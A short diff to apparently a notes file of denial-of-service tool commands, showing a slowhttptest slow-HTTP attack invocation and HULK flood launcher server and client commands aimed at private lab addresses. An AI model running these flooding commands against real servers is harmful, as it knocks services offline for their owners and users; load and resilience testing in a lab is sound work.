@@ -14,9 +14,9 @@ slowhttptest -H -g -c 5260 -i 10 -r 30 -t GET -u http://10.100.0.2:3000/ -x 24 -
     -p 3: Number of child processes to fork
 
 ## hulk
-python3 hulk_launcher.py server -p 3000 http://100.10.0.2:3000
+python3 HULK-v3/hulk_launcher.py server -p 3000 http://100.10.0.2:3000
 
-python3 hulk_launcher.py server [-h] [-p PORT] [-m MAX_MISSILES] [--persistent] [--gui] target
+python3 HULK-v3/hulk_launcher.py client -n 10
 
 ### Server :computer:
 usage: hulk_launcher.py server [-h] [-p PORT] [-m MAX_MISSILES] [--persistent] [--gui] target
